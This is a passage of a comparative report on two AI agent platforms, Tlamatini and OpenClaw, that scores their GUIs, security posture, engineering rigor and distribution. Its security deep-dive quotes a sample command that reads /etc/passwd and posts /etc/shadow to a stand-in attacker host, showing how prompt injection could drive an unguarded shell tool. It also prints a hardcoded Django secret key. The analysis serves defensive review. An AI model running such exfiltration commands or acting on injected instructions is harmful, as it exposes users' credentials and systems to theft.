| Visual designer                 | Yes — drag-and-drop ACP canvas with 57 typed nodes                       | No native designer; some Lobster workflows use a deterministic checkpoint model         |
| External AI delegation          | Limited; agents run inside Tlamatini's process tree                      | Strong; ACPX spawns external CLIs as child agents                                       |
| Skill model                     | Tightly typed Python agents + LangChain @tool                            | Markdown SKILL.md + plugin SDK runtime extensions + MCP                                 |
| Catalog growth path             | Add a new agent: 8-step process (CSS, JS, migration, docs)               | Add a plugin: compose manifest, write TS, publish to ClawHub                            |

### 6.5 What Each System Is Optimized For

Tlamatini's agent system is optimized for **deterministic, reproducible local automations** the user composes visually — "watch a folder, run a Crawler when something appears, parametrize the result into an Apirer, notify on completion." The LLM is mostly there to author and execute, not to orchestrate the runtime; the runtime is deterministic Python.

OpenClaw's plugin system is optimized for **orchestrating heterogeneous AI services across messaging channels and platforms** — "this Discord message arrives, route it to Claude, this WhatsApp message arrives, route it to Codex, log everything to active memory." The LLM is the orchestrator; the runtime is the gateway.

These are different problems. Both are valid.

---

## 7. Graphical User Interface and Frontend Surface

### 7.1 Tlamatini GUI

Tlamatini's GUI is a Bootstrap-based Django web frontend served from `agent/templates/agent/agent_page.html` and bundled JS modules in `agent/static/agent/js/`. There are 23 JavaScript modules organized into three families:

- **Chat (8 modules):** `agent_page_init.js`, `agent_page_chat.js`, `agent_page_canvas.js` (code canvas for code blocks), `agent_page_context.js`, `agent_page_dialogs.js`, `agent_page_layout.js`, `agent_page_state.js`, `agent_page_ui.js`.
- **ACP Workflow Designer (11 modules):** `agentic_control_panel.js`, `acp-globals.js` (with `updateCanvasContentSize()` for canvas growth), `acp-canvas-core.js` (renderer + drag-and-drop + classMap + connection handlers), `acp-canvas-undo.js` (1,024-action undo/redo), `acp-agent-connectors.js` (50+ connection handlers), `acp-control-buttons.js` (start/stop/pause/hypervisor), `acp-file-io.js` (.flw save/load), `acp-running-state.js` (LED indicators + process monitoring), `acp-session.js`, `acp-layout.js`, `acp-validate.js`.
- **Shared (4 modules):** `canvas_item_dialog.js`, `contextual_menus.js`, `tools_dialog.js`, `acp-undo-manager.js`.

The ACP canvas is a **two-layer scrollable DOM** that is documented carefully in the project's `docs/claude/frontend.md` because it has been a source of coordinate-math bugs:

- `#submonitor-container` — the viewport (with `overflow: auto`, fixed to the available panel size, owns the themed scrollbars).
- `#canvas-content` — the content layer inside the viewport (`position: relative`, `min-width: 100%`, `min-height: 100%`, grows when items extend past the viewport via `updateCanvasContentSize()`). All `.canvas-item` agents, the SVG `#connections-layer`, and the rubber-band `#selection-box` live here.

Coordinate math always uses `canvasContent.getBoundingClientRect()` which already incorporates the scroll offset; mixing in `submonitor.scrollLeft/scrollTop` causes items to jump under the cursor when the user scrolls, a regression that has been called out and patched in the recent past.

Beyond the chat and ACP screens, the system also includes contextual menus (right-click), modal dialogs for canvas items, a tools-enable/disable dialog, and a notification subsystem. The GUI plays sounds on completion (`notification.wav`) and on FlowHypervisor alerts (`hypervisor_alert.wav`).

### 7.2 OpenClaw GUI

OpenClaw's GUI surface is split across multiple front-ends:

1. **Web Control UI (`ui/`)** — a Vite-built Lit.js single-page app for agent management, config, and channel monitoring. It is *not* a chat UI in the way Tlamatini's is; it is a control panel.
2. **Native iOS app (`apps/ios/`)** — Swift / SwiftUI, target iOS 15+, integrating with the gateway via WebSocket.
3. **Native Android app (`apps/android/`)** — Kotlin / Jetpack Compose.
4. **Native macOS desktop app (`apps/macos/`)** — Swift, gateway pairing, native notifications, with a separate `apps/macos-mlx-tts/` for Apple Silicon-optimized text-to-speech.
5. **TUI (`src/terminal/`)** — text user interface for interactive chat and configuration when running the CLI directly.
6. **Canvas host (`src/canvas-host/`)** — a browser-based GUI rendering layer with A2UI bundle support; this is closer to Tlamatini's ACP visual designer in spirit but lacks an equivalent 57-typed-node catalog.
7. **Standalone HTML previews** — `dream-diary-preview-v2.html`, `dream-diary-preview-v3.html` are experimental visualizations (animated SVG, dark theme, lobster branding) for ACP flow state or agent-session tracking.

### 7.3 GUI Comparison

| Dimension                  | Tlamatini                                                          | OpenClaw                                                                     |
|----------------------------|--------------------------------------------------------------------|------------------------------------------------------------------------------|
| Primary GUI                | Django web GUI: chat + ACP visual designer                         | Lit.js Control UI (settings/config) + native mobile + macOS apps             |
| Chat UI                    | Yes, deeply integrated, multi-turn aware                           | TUI in core; native apps; web Control UI is config-focused                   |
| Visual workflow designer   | Yes, 57 typed nodes, drag-and-drop, undo/redo, .flw save/load      | Canvas-host exists but no equivalent 57-typed-node catalog                   |
| Native mobile apps         | None                                                               | iOS, Android                                                                 |
| Native desktop apps        | None (Windows installer launches the Django runserver locally)     | macOS native app + macOS-mlx-tts companion                                   |
| Frontend stack             | jQuery + Bootstrap + custom JS modules                             | Lit 3 + Vite + Lit Context + Lit Labs Signals                                |
| Internationalization       | None                                                               | 21 locales in `ui/src/`                                                      |
| Theming / branding         | Tlamatini-themed gradients per agent (CSS)                         | Lobster/OpenClaw branding; per-channel theming via plugins                   |
| GUI testing                | None visible                                                       | JSDOM in Vitest config                                                       |
| Sound / haptics            | `notification.wav`, `hypervisor_alert.wav`                         | Native mobile haptics; voice + TTS                                           |

The most striking takeaway from this dimension is that **Tlamatini wins decisively on the "visual workflow designer for agentic AI" axis** — it is genuinely the only one of the two with such a capability, and the agent palette of 57 typed nodes plus drag-and-drop wiring plus a clean .flw file format plus undo/redo plus a Create-Flow-from-Multi-Turn-answer button is a real, distinguishing capability. OpenClaw wins decisively on **multi-platform native client coverage** — iOS, Android, macOS, plus the web Control UI and a TUI.

---

## 8. Security Posture (Deep Dive)

This is the longest section of this report, because the security gap between the two projects is the single largest finding. We will work through eight axes — documentation and policy, sandboxing and isolation, authentication and access control, secret management, tool/command-injection surface, network surface, supply chain, and a final scoring table — and provide file-and-line evidence for each.

### 8.1 Security Documentation and Policy

**OpenClaw (9/10).** A 330-line `SECURITY.md` describes the threat model in detail. It defines the trust boundary explicitly: an authenticated gateway caller is treated as a single operator with full access, *not* as a node in an adversarial multi-tenant system (lines 99 to 177). The vulnerability scope is articulated with the same explicitness — prompt injection alone is **not** a vulnerability unless it crosses the tool-policy, sandbox, or auth boundary (lines 138, 200 to 201). Out-of-scope items are listed plainly so reporters do not waste cycles. A vulnerability-reporting channel is documented (`security@openclaw.ai`). The named Security Lead is Jamieson O'Reilly (Dvuln), with maintainer-level Security ownership distributed among Vincent Koc, Seb Slight, Josh Avant, Mariano Belinky, and Robin Waslander. There is a separate `INCIDENT_RESPONSE.md` describing severity classification (Critical / High / Medium / Low), triage, response workflow, and communication policy.

**Tlamatini (1/10).** No `SECURITY.md`, no `INCIDENT_RESPONSE.md`, no published vulnerability-reporting address. The README does not articulate a threat model. Default credentials (`user / changeme`) are documented at the *deployment* layer — they appear in `build.py` as `DJANGO_SUPERUSER_PASSWORD = 'changeme'` and in the README as the post-installer credentials — but they are not flagged as a security advisory or even as a "change me before exposing this on a network" warning. Tlamatini's intended use is single-user local-first, which mitigates much of the damage, but the absence of a written boundary makes the system harder to reason about safely.

### 8.2 Sandboxing and Isolation

**OpenClaw (8/10).** The repository ships three sandbox Dockerfiles: `Dockerfile.sandbox` (base sandbox image, non-root `sandbox` user, minimal tools — bash, curl, git, jq, python3, ripgrep), `Dockerfile.sandbox-browser` (base + chromium + xvfb + x11vnc + novnc + websockify, exposing 9222 / 5900 / 6080 for browser-driven agent automation), and `Dockerfile.sandbox-common` (a base for arbitrary additional tiers including dev tools — gcc, cargo, rustc, python3, nodejs, go, brew, bun, pnpm). The `docker-compose.yml` runs the gateway container as non-root, and the CLI container drops capabilities (`cap_drop: [NET_RAW, NET_ADMIN]`) and applies `security_opt: [no-new-privileges:true]`. Optional Docker socket mounting for nested sandbox runtime is opt-in (commented out by default). `SECURITY.md` lines 119 to 122 document that exec behavior is host-first by default (`agents.defaults.sandbox.mode` = `off`), but operators can enable `non-main` or `all` sandbox modes. Temporary path isolation (lines 234 to 248) validates `/tmp/openclaw` against absolute paths and rejects host-tmp escape attempts.

**Tlamatini (2/10).** No sandbox at all. The `execute_command` tool in `agent/tools.py` (lines 1674 to 1761) calls `subprocess.run()` with `shell=True` on Windows and falls back to `shell=True` on Unix when `shlex.split()` parsing fails. There is a path-validation guard (`validate_tool_path()`) that prevents path traversal into restricted directories, but it does *not* prevent command-injection metacharacters (`;`, `|`, `&&`, backticks). All commands run as the host user — typically the desktop user who launched the Django server. There are additional `subprocess.Popen()` calls scattered throughout `agent/views.py` (lines 2442, 2709, 3274, 3628, 6146, 6817, 8142, 8188, etc.) for launching file explorers, editors, and detached CLI tools, all with `shell=True`.

### 8.3 Authentication and Access Control

**OpenClaw (7/10).** The trust model is "one operator per gateway" — explicitly all-or-nothing. `SECURITY.md` lines 101 to 122 document that authenticated callers receive `operator.admin` scope regardless of any `x-openclaw-scopes` header they provide; HTTP endpoint authentication uses a shared-secret bearer token or password; tool approval gates exist as operator guardrails to prevent accidental execution rather than as multi-user authorization (line 211); session IDs are routing identifiers, not authorization tokens (line 113). The recommended deployment topology is "one user per machine/VPS, one gateway per user" (lines 116 to 118, 166).

**Tlamatini (4/10).** Django's standard `AuthenticationForm` plus `authenticate()` plus `login()` flow is wired up in `views.py` (lines 80 to 100). Many control endpoints carry `@login_required`. But the file also has at least 60 `@csrf_exempt` decorators, indicating that most agent and WebSocket endpoints intentionally bypass CSRF checks (commonly needed for non-browser clients but a real risk if a hostile origin is reachable). User filtering is per-request user (line 112: `AgentMessage.objects.filter(conversation_user=request.user)`), but there is no per-conversation or per-tool authorization beyond Django's default permission system. The build script seeds a `user` account with password `changeme`. Multi-user isolation is not a goal of the system.

### 8.4 Secret Management

**OpenClaw (8/10).** API keys flow through environment variables. The `docker-compose.yml` sets `CLAUDE_AI_SESSION_KEY`, `CLAUDE_WEB_SESSION_KEY`, and `CLAUDE_WEB_COOKIE` from the shell environment. There is an active `.pre-commit-config.yaml` running `detect-secrets` (v1.5.0), maintaining a `.secrets.baseline` file (433 KB), with `pnpm-lock.yaml` exempt from high-entropy scanning to avoid noise. `.detect-secrets.cfg` configures the scanner. Plugin-installed credentials live in `~/.openclaw/credentials/` separately from the workspace.

**Tlamatini (1/10).** API keys are stored in `agent/config.json` in plaintext: line 8 reads `"ANTHROPIC_API_KEY": "config you api key here by claude"` as a placeholder, but the operator is expected to fill in their actual key in the same file. There is no `.env` file convention. The Django `SECRET_KEY` in `tlamatini/settings.py` is a hardcoded literal (line 26: `SECRET_KEY = 'django-insecure-1$f=fy&i80tqgzy%#^x@^am%)duwk7qq5_*807l)mtrsj$$7wk'`). `DEBUG=True` is the default (line 29). There is no secret scanning, no pre-commit hook, no `.secrets.baseline`. If an operator inadvertently commits `config.json` with a real API key in it, the leak is immediate.

### 8.5 Tool / Command-Injection Surface

**OpenClaw (8/10).** Bash tool execution is gated by approval. Files like `src/agents/bash-tools.exec-approval-request.ts` and `bash-tools.exec-approval-followup.ts` implement approval workflows before any shell command runs. Shell escapes for OS-specific paths (e.g. macOS plist) are explicit. Multiple exec surfaces (`gateway`, `node`, `sandbox`) each carry their own heuristic command-risk detection; differences between heuristics are documented as out-of-scope unless they cross a boundary (`SECURITY.md` line 213). Tools can be restricted by operator policy; owner-only tools are enforced (lines 109 to 110).

**Tlamatini (2/10).** The `execute_command` LangChain tool is directly exposed to the LLM in Multi-Turn mode with no approval gate. If the LLM is convinced (by prompt injection, by user error, or by an off-target tool call) to execute `cat /etc/passwd; curl https://attacker.example.com/exfil --data @/etc/shadow`, that command runs as the host user. There is no allowlist, no sudo gating, no PowerShell ExecutionPolicy override check, no audit log, no per-command operator confirmation. The path guard helps with one specific bug (writing files outside the project) but does not address the larger command-injection surface. Combined with the wide `ALLOWED_HOSTS` and 60+ `@csrf_exempt` endpoints, a network-exposed Tlamatini is a remote-code-execution risk.

### 8.6 Network Surface

**OpenClaw (8/10).** `gateway.bind="loopback"` is the default per `SECURITY.md` line 274. Lines 285 to 287 say plainly: "Do **not** expose it to the public internet (no direct bind to `0.0.0.0`, no public reverse proxy). It is not hardened for public exposure." Remote access is recommended via SSH tunnel or Tailscale (line 286). The canvas host is intentional for trusted-node scenarios with LAN/tailnet plus firewall controls (lines 281 to 284). The `docker-compose.yml` default port binding is `${OPENCLAW_GATEWAY_PORT:-18789}:18789`; the compose command uses `--bind lan` which still requires host-level configuration.

**Tlamatini (3/10).** `tlamatini/settings.py` line 31 sets `ALLOWED_HOSTS = ['*']`, accepting requests from any hostname header. `DEBUG=True` (line 29) means errors reveal stack traces, settings, and SQL queries to anyone who can reach the server. The 60+ `@csrf_exempt` decorators on `views.py` mean cross-origin requests can post freely to most endpoints. The default Django runserver listens on 127.0.0.1:8000 but Daphne (the ASGI server actually used by the project) binds based on operator command-line arguments and may default to all interfaces in some configurations. The README does not warn against network exposure. This combination is intentional for a single-user local-first tool, but unsuitable for any environment where another machine on the network is potentially hostile.

### 8.7 Supply Chain

**OpenClaw (9/10).** `pnpm-lock.yaml` (477 KB) records integrity hashes for every transitive dependency. `.pre-commit-config.yaml` runs `detect-secrets`, `trailing-whitespace`, `end-of-file-fixer`, `check-yaml`, `check-added-large-files`. `knip.config.ts` finds dead exports across workspaces, bundles, and the 131 plugin extensions, with knip rules that keep extensions from reaching into core internals. `pnpm.overrides` pins known-vulnerable transitive deps (axios 1.15.0+, follow-redirects 1.16.0+, uuid 14.0.0+); `pnpm.patchedDependencies` patches `@whiskeysockets/baileys` and `@agentclientprotocol/claude-agent-acp`. The runtime requires Node 22.14.0+ for CVE-2025-59466 and CVE-2026-21636 fixes (`SECURITY.md` lines 291 to 301). Recommended Docker run is non-root `node` user with `--read-only`, `--cap-drop=ALL` (lines 304 to 318). Dependabot, CodeQL, and npm advisories are referenced in `INCIDENT_RESPONSE.md` (line 9).

**Tlamatini (2/10).** `requirements.txt` has 62 pinned dependencies but no lockfile. No `pip-compile`, no `poetry.lock`, no `pipenv.lock`. No pre-commit hooks. No detect-secrets. No semgrep. No CodeQL. No Dependabot. The dependency list contains several packages that significantly enlarge the attack surface — `playwright==1.52.0` (browser automation, often Chromium with several CVEs per quarter), `langchain` and friends (large, fast-moving, occasionally vulnerable), `PyAutoGUI` (which automates the host desktop and can be coerced to type credentials into reachable windows), `torch` (which pulls native code). No documented Python minimum-version security baseline.

### 8.8 Master Security Scoring Table

| Axis                  | OpenClaw                                                                                              | Tlamatini                                                                                |
|-----------------------|-------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------|
| Documentation         | 9/10 — 330-line SECURITY.md, INCIDENT_RESPONSE.md, named lead                                         | 1/10 — no SECURITY.md, no IR doc, defaults documented but not as advisory                |
| Sandboxing            | 8/10 — three Dockerfiles, cap_drop, no-new-privileges, optional sandbox modes                         | 2/10 — none; subprocess.run shell=True direct on host as logged-in user                  |
| Authentication        | 7/10 — explicit single-operator model, all-or-nothing, no multi-tenant claims                         | 4/10 — Django auth + login_required, but 60+ @csrf_exempt; defaults to user/changeme     |
| Secrets               | 8/10 — env vars, detect-secrets, .secrets.baseline                                                    | 1/10 — API key plaintext in config.json; hardcoded SECRET_KEY; DEBUG=True; no scanning   |
| Injection surface     | 8/10 — approval gates, heuristic risk detection, allowlist policy                                     | 2/10 — execute_command directly exposed; shell=True everywhere; no approval UI           |
| Network surface       | 8/10 — default loopback bind, explicit non-public-internet warnings                                   | 3/10 — ALLOWED_HOSTS=['*']; 60+ @csrf_exempt; DEBUG=True default                         |
| Supply chain          | 9/10 — pnpm-lock, detect-secrets pre-commit, Knip, explicit Node version, patched deps                | 2/10 — requirements.txt only, no lockfile, no scanning                                   |

**Overall:** OpenClaw averages 8.1/10 on security posture; Tlamatini averages 2.1/10. The gap is wide and consistent across every axis. The point is not that Tlamatini is a poorly-built project — it is genuinely sophisticated software — but that its security posture is calibrated for **single-user local-first usage on a trusted machine**, and operators must respect that boundary.

---

## 9. Code Professionalism and Engineering Rigor

### 9.1 Type System

OpenClaw runs strict TypeScript across 4,891+ TS lines and depends on multiple `tsconfig.*.json` files for legitimately separated build/test/lint pipelines: `tsconfig.core.json` (main core), `tsconfig.core.test.json` (general tests), `tsconfig.core.test.agents.json` and `tsconfig.core.test.non-agents.json` (test isolation by agent scope), plus an oxlint-driven type pipeline. `noEmit: true`, `declaration: true`, and `strict: true` are all set. There are 13+ custom `.d.ts` declaration files in `src/types/`. Path mappings are configured for monorepo navigation. **Strong.**

Tlamatini's Python code uses type hints inconsistently. `mcp_agent.py` shows imports for `Dict[str, str]`, `Tuple` etc. on lines 5 to 6, but `views.py` (8,534 lines, 124 functions) has no systematic annotation. There is no `mypy.ini`, no `setup.cfg [mypy]` block, no `pyproject.toml` mypy section. No mypy in any CI step. **Weak.**

### 9.2 Linting and Formatting

OpenClaw uses Oxlint 1.61.0 with a 40+ rule `.oxlintrc.json`; `oxfmt` for formatting; `.pre-commit-config.yaml` for hook-level checks (detect-secrets, trailing-whitespace, large-file detection, merge-conflict markers); `knip.config.ts` (140 lines) for dead-export detection across the root, ui, packages, and 126 plugin extensions; `.swiftlint.yml` for the iOS app; `.shellcheckrc` for shell scripts; `pyproject.toml` Ruff configuration for the Python skills. **Strong.**

Tlamatini has `eslint.config.mjs` for JavaScript only; declares `ruff==0.14.5` in `requirements.txt` but ships no `ruff.toml` configuration; no Black or isort; no `.pre-commit-config.yaml`. **Weak.**

### 9.3 Testing Infrastructure

OpenClaw uses Vitest 4.1.5 with a root config and `ui/vitest.config.ts`. There are roughly 4,917 `*.test.ts` and `*.test.tsx` files across the monorepo. Tests are colocated with source where appropriate, with shared fixtures, mocks, and test utilities. JSDOM is configured for DOM testing. The `qa/` folder contains end-to-end and integration tests. **Strong.**

Tlamatini has a single `agent/tests.py` file (2,502 lines) using Django's test runner. It contains 23 test classes including `P0HardeningTests`, `CapabilitySelectionTests`, `MultiTurnToolQuotaTests`, `ExecReportCaptureTests`, `LoadedContextFallbackTests`, `AssignmentParserRobustnessTests`. The naming and content suggest these are functional tests against the project's most error-prone pieces (capability scoring, tool-quota enforcement, exec-report rendering, and the conjunction-aware argument parser). **Moderate** — small in count and concentration but targeted at real failure modes.

### 9.4 CI/CD

OpenClaw's `.github/workflows/` directory contains 38 workflow files (counted directly above). Names include `ci.yml`, `codeql.yml`, `codeql-android-critical-security.yml`, `codeql-critical-quality.yml`, `codeql-macos-critical-security.yml`, `docker-release.yml`, `docs.yml`, `docs-agent.yml`, `docs-sync-publish.yml`, `docs-translate-trigger-release.yml`, `full-release-validation.yml`, `install-smoke.yml`, `live-media-runner-image.yml`, `macos-release.yml`, `npm-telegram-beta-e2e.yml`, `openclaw-cross-os-release-checks-reusable.yml`, `openclaw-live-and-e2e-checks-reusable.yml`, `openclaw-npm-release.yml`, `openclaw-release-checks.yml`, `package-acceptance.yml`, `parity-gate.yml`, `plugin-clawhub-release.yml`, `plugin-npm-release.yml`, `plugin-prerelease.yml`, `qa-live-transports-convex.yml`, `sandbox-common-smoke.yml`, `stale.yml`, `test-performance-agent.yml`, `workflow-sanity.yml`, and others. Dependabot is enabled. CodeQL runs on multiple critical-quality and security profiles. Reusable workflows compose the release pipeline. **Strong.**

Tlamatini's `.github/workflows/` directory contains a single workflow: `name-guard.yml` (3,745 bytes) — a name-validation guard, not a build-test-lint pipeline. There is no automated CI for tests, no CodeQL, no Dependabot, no release pipeline. Builds happen via `python build.py` invoked manually by the developer. **Absent.**

### 9.5 Documentation Density and Quality

OpenClaw's `docs/` folder is rich and human-aimed. Subdirectories include `concepts/`, `cli/`, `gateway/`, `debug/`, `diagnostics/`, `channels/`, `automation/`, `install/`. The `docs.json` index file is 48KB and structures the documentation set. The README is 483 lines and uses structured navigation. `AGENTS.md` (18 KB) describes the agent-system architecture for contributors. JSDoc conventions are evident throughout TypeScript files. **Strong.**

Tlamatini's documentation strategy is unusual but effective for its purpose. The README is 4,479 lines (about 9x OpenClaw's). The `docs/claude/` subfolder contains 8 markdown files (`agents.md`, `architecture.md`, `exec-report.md`, `frontend.md`, `gotchas.md`, `multi-turn.md`, `mcp-tools.md`, `INDEX.md`) authored as Claude-Code import targets — they are loaded into the LLM's context automatically when an assistant works in the repo. The CLAUDE.md is 10 KB; a sibling `KIMI.md` is 44 KB. There is no end-user-aimed `docs/` folder. The strategy optimizes for "the next AI assistant who works on this codebase will have a working mental model" rather than for "an external operator setting it up." **Strong (for AI-assisted development); Moderate (for general operator onboarding).**

### 9.6 Code Organization

OpenClaw's monorepo enforces clear boundaries: 4 workspace patterns in `pnpm-workspace.yaml`, 3 published packages, 4 native apps, 131 plugin extensions, a Vite-built UI separated from core. Knip rules prevent extensions from importing into core internals; the public plugin API surface is `openclaw/plugin-sdk/*` exclusively. Each extension owns its own `package.json`, manifest, source, and tests. **Strong.**

Tlamatini lives in a single Django app where one views.py file is 8,534 lines holding 124 view functions. That is a significant concentration risk — any contributor to the system has to navigate one very large file, and merge conflicts in a multi-author setting would be painful. For a single-developer project this is a known and accepted trade-off (mental indexing scales with the developer, not the file size), but in any wider-team context it would need refactoring into views packages. **Weak (in absolute terms); Acceptable (for solo authorship).**

### 9.7 Commit Hygiene

OpenClaw's last 30 commits read like a mature professional repo: `docs:`, `fix:`, `test:`, `feat:`, `perf:`, `refactor:`, `ci:` prefixes; scoped messages such as `fix(cli):`, `fix(auth):`, `test(configure):`. Conventional commits are evidently followed. Examples from the recent log include `docs: classify media decode`, `fix: send OpenClaw attribution`. **Strong.**

Tlamatini's last 30 commits include lines such as "Cleaning some k's, by angelahack1", "Just a couple of addings", "Yaet another and another improvement", "Hope this improvement lastly works for Multi-turn", "Just linting", and "TeleTlamatini updates: config, agent script, FlowCreator skill, views." There is no scope prefix, no subject-line discipline, and the messages are conversational rather than technical. The recent log on `main` includes `1ad4fb0 Cleaning some k's, by angelahack1`, `7ae69e5 TeleTlamatini updates: config, agent script, FlowCreator skill, views.`, `c49a6ba Drop OpenClaw comparison section from Gatewayer docs.`, `147a784 Improving TeleTlamatini, by Tlamatini-auto-bot.`, `09451c2 Just a couple of addings, by auto-bot-Tlamatini.` This is consistent with a solo-author repo. **Weak (against any style guide); Acceptable (for personal workflow).**

### 9.8 Hooks and Pre-Commit

OpenClaw maintains an active `.pre-commit-config.yaml` with 5+ repos and at minimum these hooks: `detect-private-key`, `detect-secrets` (v1.5.0), `trailing-whitespace`, `end-of-file-fixer`, `check-yaml`, `check-added-large-files`. The `.secrets.baseline` file is 433 KB. **Strong.**

Tlamatini has no `.pre-commit-config.yaml`. The `.git/hooks/` directory contains only the standard `*.sample` files. **Absent.**

### 9.9 Issue / PR Templates and CODEOWNERS

OpenClaw has a `.github/CODEOWNERS` file (2.7 KB) with team-based ownership annotations such as `@openclaw/secops` for security, auth, and secrets paths. Three issue templates (`bug_report.yml`, `feature_request.yml`, `config.yml`) are present. A pull-request template (3.5 KB) prescribes the structure for PR descriptions: Summary, Change Type checklist, Scope checklist, Root Cause analysis. A `labeler.yml` (12 KB) auto-labels PRs. **Strong.**

Tlamatini has no CODEOWNERS, no issue templates, no PR template. **Absent.**

### 9.10 Versioning and Release Notes

OpenClaw's `CHANGELOG.md` is **8,254 lines** with detailed semantic versioning (calendar-versioned as `YYYY.M.D`, e.g. `2026.4.26`), categorized fixes/features, and per-author attribution. The `appcast.xml` is 163 KB and provides Sparkle-style auto-update metadata for the macOS app: timestamps, release notes, version pointers. **Strong.**

Tlamatini has no `CHANGELOG.md` and no `appcast.xml`. Versioning is implicit in git history. Build scripts exist (`build.py`, `build_installer.py`, `build_uninstaller.py`, totaling 30 KB+) but no formal release coordination is visible. **Absent.**

### 9.11 Engineering-Rigor Master Table

| Axis                          | OpenClaw      | Tlamatini      | Note                                                                                              |
|-------------------------------|---------------|----------------|---------------------------------------------------------------------------------------------------|
| Type system                   | Strong        | Weak           | Strict TS vs ad-hoc Python type hints; no mypy on Tlamatini                                       |
| Linting/formatting            | Strong        | Weak           | Oxlint+oxfmt+pre-commit+knip vs ESLint-only + Ruff declared without config                        |
| Testing infrastructure        | Strong        | Moderate       | Vitest with 4,917 test files vs single 2,502-line tests.py with 23 targeted classes               |
| CI/CD                         | Strong        | Absent         | 38 workflows + CodeQL + Dependabot vs 1 name-guard workflow                                       |
| Documentation                 | Strong        | Moderate       | docs/ folder with 20+ subdirs vs 4,479-line README + Claude-aimed docs/claude/                    |
| Code organization             | Strong        | Weak           | Plugin SDK + workspace boundaries vs 8,534-line views.py with 124 functions                       |
| Commit hygiene                | Strong        | Weak           | Conventional commits vs informal personal-workflow messages                                       |
| Hooks/pre-commit              | Strong        | Absent         | detect-secrets + 5 hooks vs no .pre-commit-config.yaml                                            |
| Templates / CODEOWNERS        | Strong        | Absent         | CODEOWNERS + 3 issue templates + PR template + labeler vs none                                    |
| Versioning / release notes    | Strong        | Absent         | 8,254-line CHANGELOG + Sparkle appcast vs no CHANGELOG, no formal release pipeline                |

---

## 10. Testing and Quality Assurance

OpenClaw's QA story is comprehensive and structurally enforced. Vitest is the primary test framework; tests are colocated with source files (`*.test.ts`, `*.test.tsx`) and run by 38+ GitHub Actions workflows on every PR. CodeQL runs both general security and platform-specific (Android, macOS) critical-security profiles. The `qa/` folder hosts the QA harness used by `qa-live-transports-convex.yml`; `test-fixtures/` provides shared scaffolding. There are package-acceptance, install-smoke, and parity-gate workflows that exercise the system end-to-end.

Tlamatini's QA is concentrated in `agent/tests.py`. The 23 test classes target real, identified failure modes — `P0HardeningTests`, `CapabilitySelectionTests`, `MultiTurnToolQuotaTests`, `ExecReportCaptureTests`, `LoadedContextFallbackTests`, `AssignmentParserRobustnessTests`. The `gotchas.md` document records the institutional memory of fixed bugs ("planner statelessness on short follow-ups", "wrapped chat-agent dedup", "Googler Playwright + async loop", "cancel/rebuild race", "exec-report persistence ordering", "ACP canvas DOM split", "wrapped-agent assignment parser must split on `and`/`with`"), and several of those have explicit test coverage. This is unusual and laudable: the test suite is small but focused on the project's known sharp edges. The trade-off is that there is no automated test execution on commit, no CodeQL, no Dependabot, no install-smoke; tests must be run manually with `python manage.py test agent.tests`.

---

## 11. Documentation Surface

OpenClaw's documentation is wide. The `docs/` folder has 20+ subdirectories, more than 750 markdown files in total across the repo, the `docs.json` index for a structured-doc browser, and a 483-line README. The audience is human operators standing up channels, configuring providers, deploying gateways. Translation infrastructure exists (`docs-translate-trigger-release.yml` workflow) and the UI ships with 21 locales.

Tlamatini's documentation is deep and Claude-aimed. The README is 4,479 lines covering installation, agent catalog, Multi-Turn behavior, Exec Report, Create Flow, FlowCreator, FlowHypervisor, MCP and tool model, and dozens of other topics. The CLAUDE.md is the entry point and imports `docs/claude/architecture.md`, `multi-turn.md`, `exec-report.md`, `agents.md`, `mcp-tools.md`, `frontend.md`, `gotchas.md`. Each of those files runs to several thousand words and embeds carefully kept institutional knowledge — the "Recent Fixes / Gotchas" subsection of `gotchas.md` is essentially a postmortem index, recording past incidents and their fixes so the next assistant working on the code does not regress them.

The two strategies are not directly comparable. OpenClaw's docs help a human operator do their job. Tlamatini's docs help an AI assistant maintain the project. Both are valid, both are working as intended.

| Dimension                | Tlamatini                                                        | OpenClaw                                                                 |
|--------------------------|------------------------------------------------------------------|--------------------------------------------------------------------------|
| Total markdown files     | 103                                                              | 756                                                                      |
| Total markdown LOC       | 24,439                                                           | 12,526                                                                   |
| Primary audience         | AI assistants working on the code                                | Human operators deploying and configuring                                |
| README length            | 4,479 lines                                                      | 483 lines                                                                |
| Structured doc index     | docs/claude/INDEX.md (8-file map)                                | docs.json (48 KB structured index)                                       |
| i18n                     | None                                                             | 21 UI locales + docs translation pipeline                                |
| Inline code docs         | Modest docstrings, with "no comments by default" convention      | JSDoc convention across TypeScript                                       |
| Postmortem / gotchas log | docs/claude/gotchas.md (rich, regression-aware)                  | INCIDENT_RESPONSE.md plus per-CVE SECURITY.md sections                   |

---

## 12. Build, Distribution, and Deployment

### 12.1 Tlamatini

Tlamatini distributes as a Windows-targeted PyInstaller-frozen executable + NSIS installer:

- `python build.py` runs the PyInstaller pipeline. Custom hooks live under `pyinstaller_hooks/` (e.g. `hook-numpy.py`, which prevents a known frozen-bundle crash from a duplicated numpy `.pyd`).
- `python build_uninstaller.py` builds the uninstaller.
- `python build_installer.py` packages everything into the NSIS installer.
- `install.py` and `uninstall.py` provide Tkinter-based GUI installers as user-facing alternatives.
- The frozen build resolves config from the install directory next to the executable; source mode resolves from `Tlamatini/agent/config.json`. `CONFIG_PATH` env var overrides both.
- The installer creates a `user / changeme` Django superuser on first run.

Deployment is local: the user runs the installed executable, which spins up the Django + Daphne stack on localhost and opens the browser to the chat UI.

### 12.2 OpenClaw

OpenClaw distributes through three channels:

1. **NPM:** `npm install -g openclaw`. The CLI binary `openclaw` is symlinked to `openclaw.mjs`, a sophisticated entry point that validates Node version, disables compile cache for source checkouts (avoiding stale dev builds), pre-loads cached help text, and lazy-loads `dist/entry.js`.
2. **Docker:** `docker pull ghcr.io/openclaw/openclaw:latest`. Multi-arch builds for linux/amd64 and linux/arm64/v8. The Dockerfile is highly optimized with build-time arguments for selective extension bundling (`OPENCLAW_EXTENSIONS`), browser-stack inclusion (`OPENCLAW_INSTALL_BROWSER`), Docker-CLI inclusion for nested sandboxing (`OPENCLAW_INSTALL_DOCKER_CLI`), and custom apt packages (`OPENCLAW_DOCKER_APT_PACKAGES`). Three stages: `ext-deps` (extract package.json files for opted-in extensions), `build` (full compile), `runtime-assets` (prune dev deps, strip source maps).
3. **Native apps:** macOS (Swift, signed/notarized, DMG or Homebrew), iOS (App Store/TestFlight), Android (Google Play / F-Droid).

Deployment targets are deliberately multi-cloud: Fly.io (`fly.toml`), Render (`render.yaml`), Hetzner (documented in `docs/install/hetzner.md`), and self-hosted Docker (`docker-compose.yml`). Persistent state lives in `~/.openclaw/` or `/data/.openclaw` in containers.

### 12.3 Build/Distribution Comparison

